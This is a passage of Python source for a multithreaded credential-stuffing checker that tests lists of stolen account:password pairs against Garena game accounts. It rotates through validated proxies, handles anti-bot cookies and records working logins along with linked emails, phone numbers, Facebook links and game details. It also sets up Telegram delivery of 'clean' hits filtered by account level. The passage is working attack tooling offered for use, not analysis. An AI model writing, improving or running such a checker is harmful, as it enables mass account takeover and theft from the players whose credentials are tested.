    out_dir.mkdir(parents=True, exist_ok=True)
    
    stats = {
        'valid_with_games': 0,
        'valid_no_games': 0,
        'valid_total': 0,
        'invalid': 0,
        'error': 0,
        'done': 0,
        'games_found': 0
    }
    stats_lock = threading.Lock()
    file_lock = threading.Lock()
    start_time = time.time()
    total = len(accounts)
    
    valid_path = out_dir / 'valid_with_games.txt'
    valid_no_games_path = out_dir / 'valid_no_games.txt'
    invalid_path = out_dir / 'invalid.txt'
    error_path = out_dir / 'errors.txt'
    games_summary_path = out_dir / 'games_summary.txt'
    games_detailed_path = out_dir / 'games_detailed.txt'
    
    valid_fh = open(valid_path, 'a', encoding='utf-8', buffering=1)
    valid_no_games_fh = open(valid_no_games_path, 'a', encoding='utf-8', buffering=1)
    invalid_fh = open(invalid_path, 'a', encoding='utf-8', buffering=1)
    error_fh = open(error_path, 'a', encoding='utf-8', buffering=1)
    games_fh = open(games_summary_path, 'a', encoding='utf-8', buffering=1)
    detailed_fh = open(games_detailed_path, 'a', encoding='utf-8', buffering=1)
    
    cookie_manager = CookieManager()
    print_lock = threading.Lock()
    
    def print_result(account, password, result, data=None):
        with print_lock:
            if result == 'valid_with_games':
                games_str = ', '.join(f"{g.get('game')}({g.get('region')})" for g in data[:3])
                if len(data) > 3:
                    games_str += f" +{len(data)-3} more"
                console.print(f"  [bold bright_green]✔[/bold bright_green]  [cyan]{account}[/cyan]  [dim]{games_str}[/dim]")
            elif result == 'valid_no_games':
                console.print(f"  [bold yellow]○[/bold yellow]  [cyan]{account}[/cyan]  [dim]No matching games[/dim]")
            elif result == 'invalid':
                console.print(f"  [bold red]✖[/bold red]  [dim]{account}[/dim]  [red]{data or 'Invalid'}[/red]")
            else:
                console.print(f"  [bold red]✖[/bold red]  [dim]{account}[/dim]  [red]Error: {data}[/red]")
    
    def update_progress():
        with stats_lock:
            done = stats['done']
            vwg = stats.get('valid_with_games', 0)
            vng = stats.get('valid_no_games', 0)
            v = stats.get('valid_total', 0)
            i = stats.get('invalid', 0)
            e = stats.get('error', 0)
            gf = stats.get('games_found', 0)
        
        elapsed = max(time.time() - start_time, 0.001)
        rate = done / elapsed if done > 0 else 0
        pct = done / total * 100 if total > 0 else 0
        
        bar_w = 24
        filled = int(pct / 100 * bar_w)
        
        with print_lock:
            console.print()
            console.print(Panel(
                f"[bright_cyan]{'█' * filled}{'░' * (bar_w - filled)}[/bright_cyan]  "
                f"[bold bright_yellow]{pct:.1f}%[/bold bright_yellow]  "
                f"[dim]{done}/{total}  ·  {rate:.1f}/s[/dim]\n"
                f"[green]✔ {v:,}[/green]  "
                f"[yellow]○ {vng:,}[/yellow]  "
                f"[red]✖ {i:,}[/red]  "
                f"[dim]· {e:,}[/dim]  "
                f"[magenta]🎮 {gf:,}[/magenta]",
                border_style="bright_cyan",
                box=box.ROUNDED,
                padding=(0, 1),
                expand=False
            ))
            console.print()
    
    def worker(account, password):
        result, data = hunter_process(account, password, cookie_manager, queries)
        
        with file_lock:
            if result == 'valid_with_games':
                valid_fh.write(f'{account}:{password}\n')
                
                games_fh.write(f'[{account}:{password}]\n')
                for conn in data:
                    game_name = conn.get('game', 'Unknown')
                    region = conn.get('region', 'Unknown')
                    role = conn.get('role', 'N/A')
                    app_id = conn.get('app_id', 'N/A')
                    games_fh.write(f"  {game_name} | Region: {region} | Role: {role} | App ID: {app_id}\n")
                games_fh.write('\n')
                
                for conn in data:
                    detailed_fh.write('------------------------------------------------------------\n\n')
                    detailed_fh.write(f'» Account: {account} : {password}\n')
                    detailed_fh.write(f'   » Game: {conn.get("game", "Unknown")}\n')
                    detailed_fh.write(f'   » Region: {conn.get("region", "Unknown")}\n')
                    detailed_fh.write(f'   » Role/UID: {conn.get("role", "N/A")}\n')
                    
                    app_id = conn.get('app_id', 'N/A')
                    if app_id and app_id != 'N/A':
                        detailed_fh.write(f'   » App ID: {app_id}\n')
                    
                    shell = conn.get('shell', 0)
                    if shell > 0:
                        detailed_fh.write(f'   » Garena Shell: {shell}\n')
                    
                    username = conn.get('username', 'N/A')
                    if username and username != 'N/A':
                        detailed_fh.write(f'   » Username: {username}\n')
                    
                    email = conn.get('email', 'N/A')
                    if email and email != 'N/A' and '@' in email:
                        masked_email = email[:3] + '****' + email[email.find('@'):]
                        detailed_fh.write(f'   » Email: {masked_email}\n')
                    
                    mobile = conn.get('mobile_no', 'N/A')
                    if mobile and mobile != 'N/A' and len(str(mobile)) >= 4:
                        mobile_str = str(mobile)
                        masked_mobile = '****' + mobile_str[-4:]
                        detailed_fh.write(f'   » Mobile: {masked_mobile}\n')
                    
                    is_clean = conn.get('is_clean', False)
                    detailed_fh.write(f'   » Clean: {"YES" if is_clean else "NO"}\n')
                    
                    uid = conn.get('uid', 'N/A')
                    if uid and uid != 'N/A':
                        detailed_fh.write(f'   » UID: {uid}\n')
                    
                    nickname = conn.get('nickname', 'N/A')
                    if nickname and nickname != 'N/A':
                        detailed_fh.write(f'   » Nickname: {nickname}\n')
                    
                    country = conn.get('country', 'N/A')
                    if country and country != 'N/A':
                        detailed_fh.write(f'   » Country: {country}\n')
                    
                    fb_info = conn.get('fb_info', 'N/A')
                    if fb_info == 'CONNECTED':
                        fb_username = conn.get('fb_username', 'N/A')
                        if fb_username and fb_username != 'N/A':
                            detailed_fh.write(f'   » Facebook: {fb_username}\n')
                        else:
                            detailed_fh.write(f'   » Facebook: CONNECTED\n')
                    
                    for key, value in conn.items():
                        if key not in ['game', 'region', 'role', 'app_id', 'username', 'email', 'mobile_no', 'shell', 'is_clean', 'uid', 'nickname', 'country', 'fb_username', 'fb_info']:
                            if value and value != 'N/A' and value != '':
                                detailed_fh.write(f'   » {key.replace("_", " ").title()}: {value}\n')
                    
                    detailed_fh.write('\n------------------------------------------------------------\n\n')
                
                with stats_lock:
                    stats['valid_with_games'] += 1
                    stats['valid_total'] += 1
                    stats['games_found'] += len(data)
                    
            elif result == 'valid_no_games':
                valid_no_games_fh.write(f'{account}:{password}\n')
                if data:
                    games_fh.write(f'[{account}:{password}] - Found {len(data)} game(s) but none matched filters\n')
                    for conn in data:
                        games_fh.write(f"  {conn.get('game')} | Region: {conn.get('region')} | Role: {conn.get('role')} | App ID: {conn.get('app_id', 'N/A')}\n")
                    games_fh.write('\n')
                
                with stats_lock:
                    stats['valid_no_games'] += 1
                    stats['valid_total'] += 1
                    
            elif result == 'invalid':
                invalid_fh.write(f'{account}:{password}\n')
                with stats_lock:
                    stats['invalid'] += 1
                    
            else:
                error_fh.write(f'{account}:{password}  | {data}\n')
                with stats_lock:
                    stats['error'] += 1
            
            with stats_lock:
                stats['done'] += 1
        
        print_result(account, password, result, data if result == 'valid_with_games' else None)
        
        with stats_lock:
            done = stats['done']
        if done % 5 == 0 or done == total or done == 1:
            update_progress()
    
    console.print(Panel(
        Text(f"Output: {out_dir}", style="bright_cyan") +
        Text(f"\nFilter: {', '.join(q['display'] for q in queries)}", style="dim"),
        border_style="bright_cyan",
        box=box.ROUNDED,
        expand=False
    ))
    print()
    
    update_progress()
    
    try:
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = {executor.submit(worker, acc, pw): (acc, pw) for acc, pw in accounts}
            for future in as_completed(futures):
                try:
                    future.result(timeout=45)
                except Exception as e:
                    acc, pw = futures[future]
                    with file_lock:
                        error_fh.write(f'{acc}:{pw}  | {str(e)}\n')
                    with stats_lock:
                        stats['error'] += 1
                        stats['done'] += 1
    except KeyboardInterrupt:
        _log('WARNING', 'Interrupted — flushing results…')
    finally:
        valid_fh.close()
        valid_no_games_fh.close()
        invalid_fh.close()
        error_fh.close()
        games_fh.close()
        detailed_fh.close()
    
    elapsed = max(time.time() - start_time, 0.001)
    with stats_lock:
        vwg = stats.get('valid_with_games', 0)
        vng = stats.get('valid_no_games', 0)
        v = stats.get('valid_total', 0)
        i = stats.get('invalid', 0)
        e = stats.get('error', 0)
        gf = stats.get('games_found', 0)
        done = stats['done']
    
    results_table = Table(title="[bold bright_yellow]🎮  HUNTER COMPLETE[/bold bright_yellow]", box=box.HEAVY, border_style="bright_yellow", show_header=True, header_style="bold dim", padding=(0, 3), expand=False)
    results_table.add_column("Category", style="dim", no_wrap=True, width=25)
    results_table.add_column("Count", justify="right", style="bright_white", width=12)
    results_table.add_column("Pct", justify="right", style="bright_yellow", width=8)
    
    def get_pct(cnt):
        return f'{cnt / done * 100:.1f}%' if done > 0 else '0.0%'
    
    results_table.add_row("[bright_green]✔  Valid (with games)[/bright_green]", f"[bright_green]{vwg:,}[/bright_green]", get_pct(vwg))
    results_table.add_row("[yellow]○  Valid (no match)[/yellow]", f"[yellow]{vng:,}[/yellow]", get_pct(vng))
    results_table.add_row("[bright_red]✖  Invalid[/bright_red]", f"[bright_red]{i:,}[/bright_red]", get_pct(i))
    results_table.add_row("[dim]·  Errors[/dim]", f"[dim]{e:,}[/dim]", get_pct(e))
    results_table.add_row("", "", "")
    results_table.add_row("[bold bright_magenta]🎮  Games Found[/bold bright_magenta]", f"[bold bright_magenta]{gf:,}[/bold bright_magenta]", "")
    results_table.add_row("[bold bright_white]◈  Total Processed[/bold bright_white]", f"[bold bright_white]{done:,}/{total:,}[/bold bright_white]", "")
    
    console.print(results_table)
    print()
    
    stats_panel = Panel(
        Text(f"⏱  Time     {int(elapsed // 60)}m {int(elapsed % 60)}s\n", style="dim") +
        Text(f"⚡  Rate     {done / elapsed:.2f} acc/s\n", style="dim") +
        Text(f"◈  Processed {done:,}/{total:,}\n", style="dim") +
        Text(f"📁  Valid (games)  {valid_path}\n", style="bright_cyan") +
        Text(f"📁  Valid (no match) {valid_no_games_path}\n", style="bright_cyan") +
        Text(f"📁  Invalid  {invalid_path}\n", style="bright_cyan") +
        Text(f"📁  Summary  {games_summary_path}\n", style="bright_cyan") +
        Text(f"📁  Detailed {games_detailed_path}\n", style="bright_cyan") +
        Text(f"🎮  Games Found: {gf:,}\n", style="bold bright_magenta") +
        Text("🎮  Powered by @Markdev", style="bold bright_magenta"),
        border_style="bright_magenta",
        box=box.ROUNDED,
        expand=False
    )
    console.print(stats_panel)
    print()
    input(f'  {_DIM}Press Enter to return to menu{_RST} ')
    
_proxy_check_local = threading.local()

def _get_check_session() -> requests.Session:
    if not hasattr(_proxy_check_local, "session"):
        s = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=1,
            pool_maxsize=1,
            max_retries=0,
            pool_block=False
        )
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        _proxy_check_local.session = s
    return _proxy_check_local.session

def _close_check_session() -> None:
    if hasattr(_proxy_check_local, "session"):
        try:
            _proxy_check_local.session.close()
        except Exception:
            pass
        del _proxy_check_local.session

def _parse_proxy_line(raw: str) -> str | None:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    if re.match(r"^(https?|socks[45])://", raw, re.IGNORECASE):
        parsed = urllib.parse.urlparse(raw)
        if parsed.hostname and parsed.port:
            return raw
        return None
    if "@" in raw:
        return "http://" + raw
    parts = raw.split(":")
    if len(parts) == 2 and parts[1].isdigit():
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        a, b, c, d = parts
        if b.isdigit():
            host, port, user, pw = a, b, c, d
        elif d.isdigit():
            user, pw, host, port = a, b, c, d
        else:
            return None
        return f"http://{urllib.parse.quote(user, safe='-._~')}:{urllib.parse.quote(pw, safe='-._~')}@{host}:{port}"
    return None

def _validate_proxy(url: str, timeout: float = 5.0) -> tuple[bool, str, float]:
    try:
        parsed = urllib.parse.urlparse(url)
        proxy_host = parsed.hostname or ""
        proxy_port = parsed.port or 8080
        if not proxy_host:
            return False, "no_host", -1.0
        raw_user = urllib.parse.unquote(parsed.username or "")
        raw_pass = urllib.parse.unquote(parsed.password or "")
    except Exception:
        return False, "parse_err", -1.0

    proxy_auth = None
    if raw_user:
        credentials = f"{raw_user}:{raw_pass}".encode()
        proxy_auth = f"Basic {base64.b64encode(credentials).decode()}"

    last_err = "dead"
    sock = None

    for target_host, target_port, target_path in [
        ("ip-api.com", 80, "/json/?fields=query,status"),
        ("api.ipify.org", 80, "/?format=json")
    ]:
        sock = None
        try:
            t0 = time.monotonic()
            sock = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
            sock.settimeout(timeout)

            req_lines = [
                f"GET http://{target_host}{target_path} HTTP/1.1",
                f"Host: {target_host}",
                "Accept: application/json",
                "Connection: close"
            ]
            if proxy_auth:
                req_lines.append(f"Proxy-Authorization: {proxy_auth}")

            sock.sendall("\r\n".join(req_lines + ["", ""]).encode())

            data = b""
            while len(data) < 4096:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"\r\n\r\n" in data and len(data) > 200:
                    break

            latency_ms = (time.monotonic() - t0) * 1000
            status_line = data.decode(errors="replace").split("\r\n", 1)[0] if data else ""
            parts = status_line.split(" ", 2)
            status_code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0

            if status_code == 200:
                body = data.decode(errors="replace").split("\r\n\r\n", 1)[-1].strip()
                if body and body[0] in "0123456789abcdefABCDEF":
                    body = body.split("\r\n", 1)[-1].split("\r\n")[0].strip()
                try:
                    jdata = json.loads(body)
                    ip = str(jdata.get("query") or jdata.get("ip") or "?").split(",")[0].strip()
                    return True, ip, latency_ms
                except Exception:
                    return True, "alive(no-ip)", latency_ms

            if status_code == 407:
                last_err = "auth_failed(407)"
            elif status_code in (401, 403):
                last_err = f"auth_denied({status_code})"
            elif status_code:
                last_err = f"http_{status_code}"

        except socket.timeout:
            last_err = "connect_timeout"
        except ConnectionRefusedError:
            last_err = "connection_refused"
            break
        except socket.gaierror:
            last_err = "dns_fail"
            break
        except Exception as e:
            last_err = type(e).__name__
        finally:
            if sock is not None:
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass
                try:
                    sock.close()
                except Exception:
                    pass
                sock = None

    if last_err not in ("auth_failed(407)", "auth_denied(403)", "auth_denied(401)", "dns_fail", "connection_refused"):
        sock = None
        try:
            t0 = time.monotonic()
            sock = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
            latency_ms = (time.monotonic() - t0) * 1000
            return True, f"alive(no-ip,{last_err})", latency_ms
        except Exception:
            pass
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass
                sock = None

    return False, last_err, -1.0

def _display_proxy_quality(valid_count, total_count, avg_latency_ms, indent="    "):
    if not total_count:
        return

    sr = (valid_count / total_count) * 100

    if sr >= 50 and 0 < avg_latency_ms <= 1500:
        tier, tc, bar_color = "HIGH",   "bold bright_green", "bright_green"
        icon, rec, note     = "🟢",     "up to 20",          "Proxies are fast and reliable. Push thread count high."
    elif sr >= 30 or (0 < avg_latency_ms <= 2500):
        tier, tc, bar_color = "MEDIUM", "bold yellow",        "yellow"
        icon, rec, note     = "🟡",     "8 – 12",             "Acceptable pool. Balance threads to avoid timeouts."
    else:
        tier, tc, bar_color = "LOW",    "bold red",            "red"
        icon, rec, note     = "🔴",     "3 – 5",              "Pool is weak. Low threads reduce wasted retries."

    lat   = f"{avg_latency_ms:.0f} ms" if avg_latency_ms > 0 else "N/A"
    BW    = 24

    def _bar(pct, width=BW, color="bright_green"):
        filled = int(pct / 100 * width)
        return (
            f"[{color}]{'█' * filled}[/{color}]"
            f"[dim]{'░' * (width - filled)}[/dim]"
        )

    def _lat_bar(ms, width=BW):
        if ms <= 0:
            return f"[dim]{'░' * width}[/dim]"
        capped = min(ms, 3000)
        filled = int(capped / 3000 * width)
        color  = "bright_green" if ms <= 800 else "yellow" if ms <= 1800 else "red"
        return (
            f"[{color}]{'█' * filled}[/{color}]"
            f"[dim]{'░' * (width - filled)}[/dim]"
        )

    lat_hint = (
        "[bright_green]Excellent[/bright_green]" if 0 < avg_latency_ms <= 800  else
        "[yellow]Acceptable[/yellow]"             if avg_latency_ms <= 1800     else
        "[red]Slow[/red]"                         if avg_latency_ms > 1800      else
        "[dim]N/A[/dim]"
    )

    table = Table(show_header=False, box=None, padding=(0, 1), expand=False)
    table.add_column(style="dim", width=22)
    table.add_column(style="white", width=36)

    table.add_row(
        "  Quality Tier",
        f"[{tc}]{icon}  {tier}[/{tc}]"
    )
    table.add_row("", "")
    table.add_row(
        "  Success Rate",
        f"[bold]{sr:.1f}%[/bold]  [dim]({valid_count:,} / {total_count:,})[/dim]"
    )
    table.add_row("", _bar(sr, color=bar_color))
    table.add_row("", "")
    table.add_row(
        "  Avg Latency",
        f"[bold]{lat}[/bold]  [dim]{lat_hint}[/dim]"
    )
    table.add_row("", _lat_bar(avg_latency_ms))
    table.add_row("", "")
    table.add_row(
        "  Rec. Threads",
        f"[bold bright_cyan]{rec}[/bold bright_cyan]"
    )
    table.add_row(
        "  Advice",
        f"[dim]{note}[/dim]"
    )

    console.print()
    console.print(Panel(
        table,
        title=f"[bold bright_white] PROXY QUALITY REPORT [/bold bright_white]",
        subtitle=f"[{tc}] {tier} TIER [/{tc}]",
        border_style=bar_color,
        padding=(1, 2),
        expand=False
    ))
    console.print()

def _validate_proxies_bulk(urls: list[str], timeout: float = 5.0, max_workers: int = 500, indent: str = "    ") -> list[str]:
    total = len(urls)
    workers = min(max_workers, max(total, 1))
    valid = []
    invalid = []
    latencies = []
    lock = threading.Lock()
    start_time = time.monotonic()

    progress = Progress(
        SpinnerColumn(),
        TextColumn("[bold bright_cyan]Validating"),
        BarColumn(bar_width=30),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        MofNCompleteColumn(),
        TextColumn("│ [green]{task.fields[valid]}✔[/green] [red]{task.fields[invalid]}✖[/red]"),
        TimeElapsedColumn(),
        TextColumn("ETA"),
        TimeRemainingColumn(),
        console=console,
        refresh_per_second=0.5
    )

    with progress:
        task = progress.add_task(
            "Validating",
            total=total,
            valid=0,
            invalid=0
        )

        def _check_one(url: str) -> None:
            ok, _, lat = _validate_proxy(url, timeout=timeout)
            with lock:
                if ok:
                    valid.append(url)
                    if lat > 0:
                        latencies.append(lat)
                else:
                    invalid.append(url)
                progress.update(
                    task,
                    completed=len(valid) + len(invalid),
                    valid=len(valid),
                    invalid=len(invalid)
                )

        def _wrapped_check(url: str) -> None:
            try:
                _check_one(url)
            finally:
                _close_check_session()

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(_wrapped_check, u) for u in urls]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass

    _close_check_session()

    avg_speed = total / max(time.monotonic() - start_time, 0.001)
    console.print(f"\n{indent}  [bold green]✔ Valid: {len(valid):,}[/bold green]   [bold red]✖ Dead: {len(invalid):,}[/bold red]   [dim]│  ~{avg_speed:.0f}/s[/dim]")

    avg_lat = (sum(latencies) / len(latencies)) if latencies else -1.0
    _display_proxy_quality(len(valid), total, avg_lat, indent)

    return valid

def bulk_check():
    clear_screen()
    display_banner()
    file_manager = AccountFileManager()
    file_viewer = AccountFileViewer()
    combo_files = file_manager.scan_combo_folder()
    if not combo_files:
        _log('ERROR', "No combo files found in 'Combo' folder. Add .txt files and retry.")
        return
    file_infos = [info for fp in combo_files for info in [file_manager.get_file_info(fp)] if info]
    if not file_infos:
        _log('ERROR', 'No valid combo files found.')
        return
    file_viewer.display_file_table(file_infos)
    selected_file = file_viewer.prompt_file_selection(file_infos)
    if file_viewer.prompt_clean_file():
        with console.status('[bright_cyan]  ↺  Cleaning file encoding…[/bright_cyan]', spinner='dots'):
            valid_count, invalid_count = file_manager.clean_file_encoding(selected_file)
        _log('SUCCESS', f'Cleaned: [bold]{valid_count}[/bold] valid, [bright_red]{invalid_count}[/bright_red] removed')
    if file_viewer.prompt_remove_duplicates():
        with console.status('[bright_cyan]  ↺  Removing duplicates…[/bright_cyan]', spinner='dots'):
            removed = file_manager.clean_duplicates(selected_file)
        _log('SUCCESS', f'Removed [bold]{removed}[/bold] duplicate(s)')
    auto_remove = file_viewer.prompt_auto_remove_checked()
    if auto_remove:
        _log('INFO', '[dim]Auto-remove enabled.[/dim]')
    prompt_proxy_setup()
    if not proxy_manager or not proxy_manager.enabled:
        _log('INFO', '[dim]Running without proxies (direct connection)[/dim]')
    else:
        _log('SUCCESS', f'[dim]Proxy enabled — {len(proxy_manager.proxies)} proxies loaded[/dim]')
    clear_screen()
    display_banner()
    accounts = []
    try:
        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                account, password = clean_account_line(line)
                if account and password:
                    accounts.append(f'{account}:{password}')
        file_table = Table(show_header=False, box=None, padding=(0, 1), expand=False)
        file_table.add_column(style='dim', width=12, no_wrap=True)
        file_table.add_column(style='bright_white', no_wrap=True)
        file_table.add_row('File', f'[bright_cyan]{Path(selected_file).name}[/bright_cyan]')
        file_table.add_row('Accounts', f'[bold bright_white]{len(accounts):,}[/bold bright_white]')
        console.print(Panel(file_table, title='[bold bright_green]✔ FILE LOADED[/bold bright_green]', border_style='bright_green', box=CARD, padding=(0, 2), expand=False, width=60))
    except Exception:
        _log('ERROR', 'Could not read file.')
        return
    if not accounts:
        _log('ERROR', 'No valid accounts found in file.')
        return
    info_table = Table(show_header=False, box=None, padding=(0, 1), expand=False)
    info_table.add_column(style='dim', width=16, no_wrap=True)
    info_table.add_column(style='bright_white', no_wrap=True)
    info_table.add_row('Total Queued', f'[bold bright_white]{len(accounts):,}[/bold bright_white]')
    info_table.add_row('Status', '[bright_green]Ready[/bright_green]')
    console.print(Panel(info_table, title='[bold bright_cyan]ℹ ACCOUNT QUEUE[/bold bright_cyan]', border_style='bright_cyan', box=CARD, padding=(0, 2), expand=False, width=50))
    results_manager = ResultsManager(selected_file)
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    live_stats = LiveStats()
    live_stats.total_accounts = len(accounts)
    using_proxy = proxy_manager and proxy_manager.enabled and len(proxy_manager.proxies) > 0
    if using_proxy:
        _log('INFO', f'[dim]Using {len(proxy_manager.proxies)} proxies[/dim]')
    else:
        _log('INFO', '[dim]Direct connection (no proxies)[/dim]')
    print()
    def _vis_len(s: str) -> int:
        import re
        return len(re.sub(r"\033\[[0-9;]*m", "", s))
    def _make_box(color: str, width: int) -> tuple:
        top = f"  {color}┏{'━' * (width + 2)}┓{_RST}"
        divider = f"  {color}┣{'━' * (width + 2)}┫{_RST}"
        bottom = f"  {color}┗{'━' * (width + 2)}┛{_RST}"
        return top, divider, bottom
    def _box_line(color: str, content: str, width: int) -> str:
        pad = width - _vis_len(content)
        return f"  {color}┃{_RST} {content}{' ' * max(pad, 0)} {color}┃{_RST}"
    term_width = shutil.get_terminal_size((80, 20)).columns
    max_threads = 200 if using_proxy else 30
    width = min(max(term_width - 6, 40), 56)
    top, divider, bottom = _make_box(_CY, width)
    print(top)
    print(_box_line(_CY, f"{_BRT}{_WH}⧫  THREAD SELECTOR{_RST}", width))
    print(divider)
    print(_box_line(_CY, f"{_GN}5–15{_RST}    {_DIM}Safe{_RST}  {_DIM}(recommended){_RST}", width))
    print(_box_line(_CY, f"{_YL}17–19{_RST}   {_DIM}Medium speed{_RST}", width))
    print(_box_line(_CY, f"{_CY}23–30{_RST}  {_DIM}Fast{_RST}" if not using_proxy else f"{_CY}21–30{_RST}  {_DIM}Fast — proxy only{_RST}", width))
    print(bottom)
    print()
    while True:
        try:
            raw = input(f"  {_CY}❯{_RST} Threads 1-{max_threads} {_DIM}(default {DEFAULT_THREADS}){_RST} {_CY}❯{_RST} ").strip()
            num_threads = DEFAULT_THREADS if not raw else int(raw)
            if 1 <= num_threads <= max_threads:
                break
            _log("ERROR", f"Enter a value between 1 and {max_threads}.")
        except ValueError:
            _log("ERROR", "Invalid input — enter a number.")
    _log("SUCCESS", f"Running with {_BRT}{num_threads}{_RST} thread(s)")
    print()
    global CHECK_OTHER_GAMES
    width_g = min(max(term_width - 6, 40), 60)
    top_g, divider_g, bottom_g = _make_box(_MG, width_g)
    print(top_g)
    print(_box_line(_MG, f"{_BRT}{_WH}◇  GAME CONNECTIONS{_RST}", width_g))
    print(divider_g)
    print(_box_line(_MG, f"{_WH}Check OTHER GAMES{_RST}  {_DIM}(AOV / ROV / FF / Delta Force…){_RST}", width_g))
    print(_box_line(_MG, f"{_DIM}Saves each game to separate file  ·  Adds ~1-3s per account{_RST}", width_g))
    print(bottom_g)
    print()
    CHECK_OTHER_GAMES = input(f"  {_MG}◇{_RST}  Check other games? (y/N) {_CY}❯{_RST} ").strip().lower() == "y"
    _log("SUCCESS" if CHECK_OTHER_GAMES else "INFO", "Will scan all Garena game connections" if CHECK_OTHER_GAMES else f"{_DIM}CODM only — skipping other game checks{_RST}")
    print()
    _TG_CFG_FILE = os.path.join(_SCRIPT_DIR_COOKIE, '.tg_cfg')
    def _tg_save(token, chat_id, mode, clean_range, nc_range):
        try:
            import json as _j
            with open(_TG_CFG_FILE, 'w', encoding='utf-8') as _f:
                _j.dump({'token': token, 'chat_id': chat_id, 'mode': mode, 'clean': clean_range, 'nc': nc_range}, _f)
        except Exception:
            pass
    def _tg_load():
        try:
            import json as _j
            if not os.path.exists(_TG_CFG_FILE):
                return None
            with open(_TG_CFG_FILE, 'r', encoding='utf-8') as _f:
                d = _j.load(_f)
            return d if d.get('token') and d.get('chat_id') else None
        except Exception:
            return None
    _saved_tg = _tg_load()
    width_tg = min(max(term_width - 6, 40), 54)
    top_tg, divider_tg, bottom_tg = _make_box(_YL, width_tg)
    print(top_tg)
    print(_box_line(_YL, f"{_BRT}{_WH}⬡  TELEGRAM NOTIFICATION SETUP{_RST}", width_tg))
    print(divider_tg)
    print(_box_line(_YL, f"{_WH}1{_RST}  {_YL}›{_RST}  {_DIM}Send Clean hits only{_RST}", width_tg))
    print(_box_line(_YL, f"{_WH}2{_RST}  {_YL}›{_RST}  {_DIM}Send Not-Clean hits only{_RST}", width_tg))
    print(_box_line(_YL, f"{_WH}3{_RST}  {_YL}›{_RST}  {_DIM}Send Both (clean + not-clean){_RST}", width_tg))
    print(_box_line(_YL, f"{_WH}4{_RST}  {_DIM}›  No Telegram (skip){_RST}", width_tg))
    print(bottom_tg)
    print()
    tg_choice = ''
    while tg_choice not in ('1', '2', '3', '4'):
        tg_choice = input(f'  {_YL}❯{_RST} ').strip()
    TG_ENABLED = tg_choice != '4'
    TG_SEND_CLEAN = tg_choice in ('1', '3')
    TG_SEND_NOTCLEAN = tg_choice in ('2', '3')
    TG_BOT_TOKEN = TG_CHAT_ID = ''
    TG_LVL_MIN_CLEAN = TG_LVL_MAX_CLEAN = TG_LVL_MIN_NOTCLEAN = TG_LVL_MAX_NOTCLEAN = 0
    TG_LVL_MAX_CLEAN = TG_LVL_MAX_NOTCLEAN = 9999
    if TG_ENABLED:
        print()
        if _saved_tg:
            width_sc = min(max(term_width - 6, 40), 80)
            top_sc, divider_sc, bottom_sc = _make_box(_GN, width_sc)
            print(top_sc)
            print(_box_line(_GN, f"{_BRT}{_WH}✔  Saved config found{_RST}", width_sc))
            print(divider_sc)
            print(_box_line(_GN, f"{_DIM}Token: {_saved_tg['token']}{_RST}", width_sc))
            print(_box_line(_GN, f"{_DIM}Chat ID: {_saved_tg['chat_id']}{_RST}", width_sc))
            print(bottom_sc)
            print()
            if input(f'  {_YL}❯ Use saved config? (y/n){_RST}  {_YL}❯{_RST} ').strip().lower() == 'y':
                TG_BOT_TOKEN, TG_CHAT_ID = _saved_tg['token'], _saved_tg['chat_id']
                _cr, _nr = _saved_tg.get('clean', [0, 9999]), _saved_tg.get('nc', [0, 9999])
                TG_LVL_MIN_CLEAN, TG_LVL_MAX_CLEAN = (_cr[0], _cr[1]) if TG_SEND_CLEAN else (0, 9999)
                TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN = (_nr[0], _nr[1]) if TG_SEND_NOTCLEAN else (0, 9999)
                width_ok = min(max(term_width - 6, 30), 40)
                top_ok, _, bottom_ok = _make_box(_GN, width_ok)
                print(top_ok)
                print(_box_line(_GN, f"{_BRT}{_WH}✔  Using saved config{_RST}", width_ok))
                print(bottom_ok)
                print()
            else:
                _saved_tg = None
        if not _saved_tg:
            width_input = min(max(term_width - 6, 40), 50)
            top_in, _, bottom_in = _make_box(_YL, width_input)
            print(top_in)
            print(_box_line(_YL, f"{_BRT}{_WH}Enter Telegram Credentials{_RST}", width_input))
            print(bottom_in)
            print()
            TG_BOT_TOKEN = input(f'  {_YL}❯ Bot Token{_RST}  {_YL}❯{_RST} ').strip()
            TG_CHAT_ID = input(f'  {_YL}❯ Chat ID{_RST}  {_YL}❯{_RST} ').strip()
            if TG_SEND_CLEAN:
                print()
                print(f'  {_DIM}Level range for {_GN}CLEAN{_RST}{_DIM} hits — format: min-max (e.g. 50-400){_RST}')
                raw_clean = input(f'  {_GN}❯ Clean level range (Enter = all){_RST}  {_GN}❯{_RST} ').strip()
                if raw_clean and '-' in raw_clean:
                    try:
                        parts = raw_clean.split('-')
                        TG_LVL_MIN_CLEAN, TG_LVL_MAX_CLEAN = int(parts[0].strip()), int(parts[1].strip())
                    except Exception:
                        pass
            if TG_SEND_NOTCLEAN:
                print()
                print(f'  {_DIM}Level range for {_RD}NOT-CLEAN{_RST}{_DIM} hits — format: min-max (e.g. 1-200){_RST}')
                raw_nc = input(f'  {_RD}❯ Not-clean level range (Enter = all){_RST}  {_RD}❯{_RST} ').strip()
                if raw_nc and '-' in raw_nc:
                    try:
                        parts = raw_nc.split('-')
                        TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN = int(parts[0].strip()), int(parts[1].strip())
                    except Exception:
                        pass
            if TG_BOT_TOKEN and TG_CHAT_ID:
                _tg_save(TG_BOT_TOKEN, TG_CHAT_ID, tg_choice, [TG_LVL_MIN_CLEAN, TG_LVL_MAX_CLEAN], [TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN])
